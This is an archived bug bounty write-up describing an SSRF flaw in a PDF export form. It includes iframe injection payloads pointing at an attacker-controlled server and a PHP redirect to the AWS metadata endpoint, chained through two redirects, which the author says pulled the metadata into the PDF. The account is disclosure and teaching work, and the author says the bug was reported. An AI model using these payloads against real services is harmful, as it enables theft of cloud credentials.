# Knock, Knock. Who’s there? SSRF! SSRF who? Redirect SSRF!

- **Source URL:** https://atemporalzen.medium.com/knock-knock-whos-there-ssrf-ssrf-who-redirect-ssrf-449f5d18c5a7?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240313144340/https://atemporalzen.medium.com/knock-knock-whos-there-ssrf-ssrf-who-redirect-ssrf-449f5d18c5a7
- **Fetched:** 2026-11-27
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/5476 (id 5476)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Knock, Knock. Who’s there? SSRF! SSRF who? Redirect SSRF!

This technical write-up is about a critical bug that I found. This is my first critical bug exploiting SSRF to exfiltrate AWS metadata. The main application of the target had a form where you could fill details about specific goals/tasks and export it as a PDF. My immediate thought was to inject HTML tags to see if it being reflected when I export the PDF. The H1 tag did reflect in the exported PDF.

`<h1>hello</h1>`
The next thing I tried was to inject an iframe tag to see if it is fetching a remote URL.

`<iframe src=https://attackserver>`
Here the attack server can be anything as simple as a [webhook](https://webhook.site/) or [requestbin](https://pipedream.com/requestbin). When I exported the PDF with the updated payload, I received a GET HTTP request to my attack server. I first checked if the request is from my own IP. If it is your own IP, then it won’t be possible to do a Server-Side Request Forgery. I checked the IP on [ipinfo.io](https://ipinfo.io/). The hostname clearly has its name as an EC2 instance. Great! Now we can try to exfiltrate data. But the weird thing about the exported PDF is that the iframe window is blank. There is no output on the PDF. Even though if we hit the [http://localhost/latest/meta-data](http://localhost/meta-data) endpoint, we cannot retrieve the secrets without having an output. I modified the payload adding width and height attributes to the iframe. It didn’t work.

`<iframe src=https://attackserver width="300" height="500">`
My next thought was to try a redirect. In my attackserver, I placed a PHP redirect file. I used [Digital Ocean](https://www.digitalocean.com/) for the attackserver. It is quick and easy to deploy an Ubuntu server. Install Apache and host a PHP file there. So the r.php file is as follows:

```
<?php
header('Location: http://169.254.169.254/latest/meta-data');
?>
```
The updated payload in the form is \<iframe src=https://attackserver/r.php> I exported the PDF. I was getting a HTTP request to r.php file but no output on the PDF. I kept trying with other payloads but in the end, No AWS secrets! I gave up on it after a few days. A month has passed and I came across a writeup/tweet saying that multiple redirects can sometime work and hit the metadata endpoint. So I then created two servers, two redirect PHP files leading to the AWS metadata endpoint. I could have done it in the same server but I went with two separate servers. Here is a diagram representing the setup.

And as expected, I was able to retrieve the AWS metadata on the exported PDF. Only possible with the help of two redirects. I immediately reported the bug and it was triaged, and rewarded within a week.
